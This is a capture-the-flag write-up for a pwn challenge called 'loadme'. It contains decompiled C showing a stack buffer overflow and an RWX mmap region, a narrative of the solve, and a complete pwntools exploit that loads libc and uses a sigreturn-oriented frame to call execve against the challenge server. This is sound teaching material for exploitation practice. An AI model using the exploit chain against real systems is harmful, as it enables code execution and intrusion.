The round 1 challenge was named loadme and had the description "I mean it does get easier than this. It's just a question of how well you know your basics"

### Analysis
After reversing it in ghidra, we get the following decompiled code
```C
undefined8 main(void)
{
  size_t filenameSize;
  char *c;
  undefined buf [256];
  char filename [264];
  void *ptr;
  size_t filesize;
  FILE *fp;
  
  memset(filename,0,0x100);
  printf("Enter file you want to read: ");
  fgets(filename,0x100,stdin);
  filenameSize = strcspn(filename,"\n");
  filename[filenameSize] = '\0';
  printf("[*] Reading %s into memory...\n",filename);
  fp = fopen(filename,"rb");
  if ((((fp != (FILE *)0x0) && (c = strstr(filename,"flag"), c == (char *)0x0)) &&
      (c = strstr(filename,"loadme"), c == (char *)0x0)) &&
     (c = strstr(filename,"bin"), c == (char *)0x0)) {
    fseek(fp,0,2);
    filesize = ftell(fp);
    fseek(fp,0,0);
    ptr = mmap((void *)0x13370000,filesize,7,0x21,-1,0);
    memset(ptr,0,filesize);
    fread(ptr,1,filesize,fp);
    fclose(fp);
    printf("I\'m sorry, I never asked for your name: ");
    read(0,buf,0x400);
    return 0;
  }
  puts("Error: Invalid file.");
  return 1;
}
```

The program first asks for a file path, replaces the newline character with a null (if any) and then opens the file. The filename cannot contain the string "flag", "loadme" or "bin". Then the file size is calculated, `mmap` is called with the file size and the contents are copied in the pages returned by `mmap` then it reads 0x400 (1024) bytes in a buffer of size 0x100 (256) which is a clear buffer overflow. Taking a look at the binary permissions, we see that it has Full RELRO, PIE and NX but no canary.

### Exploitation
The PIE threw me off and I thought it was an error on the organizers side. After confirming that PIE was intended, I was puzzled. I completely ignored the mmap arguments.

Then first hint was released and it read "_Maybe the `mmap` chunk has funny permissions_". Then I saw that the `prot` (protections) argument was set to `7` which means that `mmap` will return a page that has `RWX` permissions. It became apparent that we had to jump to the chunk to execute code in it and we could do that because the address of the chunk was fixed to `0x133713370000`.

My next attempt was to somehow open stdin using the file open and read shellcode in to `mmap` chunk and jump to it. I tried opening stdin using `/proc/self/fd/0` and `/dev/stdin`. Both didn't work since these files are un-seekable and `ftell` would return `-1`. This was resulting in a crash since in `memset`.

Then second hint was released and it read "_Try opening a file that will give you some useful 'gadgets'_". The brain jumped to the conclusion that it was libc that we were supposed to open. For some reason, I thought we could only jump to one address in libc (dumb I know) and I tried to jump to one-gadget. None worked.

When 3 minutes and 29 seconds left, the third hint was released and it read something along the lines of _Running one-gadgets might work as expected, how else can you do instead \*\*CALL\*\*ing \*\*SYS\*\*tem_. The highlighted fragments made the string "syscall" and my brain was all around the place trying to come up with a solution and I was under a lot of pressure since it was the first challenge and only 3 minutes were left. I somehow managed to remember SigReturn Oriented Programming (SROP) and pulled the pwntools docs for the syntax, made an execve syscall frame and found a gadget that would make the `sigreturn` syscall and just executed the payload on remote without testing locally. It worked and I executed `./submitter 18`  and completed the challenge.

### Exploit
Here's the final exploit

```py
#!/usr/bin/env python3
from pwn import *

def start() -> tube:
    if args.REMOTE:
        return remote("challs.airoverflow.com", 63440)
    else:
        return elf.process()
    
def attach_gdb() -> None:
    if args.REMOTE or args.NOGDB:
        return
    
    gdb.attach(p, '''
    b *main +533
    continue
               ''')
    input("ATTACHED?")

context.binary = elf = ELF("./loadme")
libc = elf.libc

p = start()

p.sendlineafter(": ", "/lib/x86_64-linux-gnu/libc.so.6")

ret = SigreturnFrame()
ret.rdi = 0x13370000 + 0x1cb42f
ret.rsi = 0
ret.rdx = 0
ret.rax = 0x3b
ret.rip = 0x13370000 + 0x00000000000288b5 # syscall; ret

payload = b'A'*552 + p64(0x13370000 + 0x0000000000045320) + \ # mov rax, 0xf, syscall
          bytes(ret)
p.sendlineafter(": ", payload)

p.interactive()
p.close()
```

### Comments
In retrospect, if I didn't make assumptions, closely at the primitives and made a plan without considering the pressure, I would have done ROP. Lesson learned.
Overall, the challenge was unconventional and awesome. It really did test your basics and my brain that has a habit of overcomplicating simple things.